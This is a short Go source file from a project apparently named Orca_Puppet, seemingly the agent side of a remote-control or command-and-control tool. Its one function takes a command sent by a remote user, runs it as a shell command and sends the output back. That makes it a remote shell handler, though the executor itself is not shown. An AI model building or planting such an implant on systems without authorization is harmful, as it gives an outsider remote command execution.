package controller

import (
	"Orca_Puppet/cli/cmdopt/shellopt"
	"Orca_Puppet/define/debug"
	"encoding/json"
	"fmt"
)

func shellCmd(sendUserId, decData string) {
	var cmdInfo shellopt.CmdInfo
	err := json.Unmarshal([]byte(decData), &cmdInfo)
	if err != nil {
		return
	}
	cmdCtx := cmdInfo.Context
	debug.DebugPrint(fmt.Sprintf(`receive cmd: %s`, cmdCtx))
	resBuffer := shellopt.ExecCmd(cmdCtx)
	shellopt.RetExecOutput(resBuffer, sendUserId)
}
